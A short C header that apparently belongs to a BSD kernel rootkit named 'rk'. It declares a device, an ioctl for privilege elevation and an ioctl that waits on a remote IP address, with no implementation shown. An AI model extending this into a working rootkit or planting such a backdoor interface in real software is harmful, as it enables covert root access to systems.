#ifndef INTERFACE_H
#define INTERFACE_H

#include <sys/ioccom.h>
#include <netinet/in.h>

#define RK_DEV_NAME "rk"

/* ioctl definitions for privilege elevation and remote wait */
#define RK_ELEVATE            _IO('r', 0x01)
#define RK_IOCTL_ELEVATE      RK_ELEVATE

#define RK_WAIT_REMOTE        _IOW('r', 0x02, struct in_addr)
#define RK_IOCTL_WAIT_REMOTE  RK_WAIT_REMOTE

int make_rk_dev(void);
void destroy_rk_dev(void);

#endif /* INTERFACE_H */
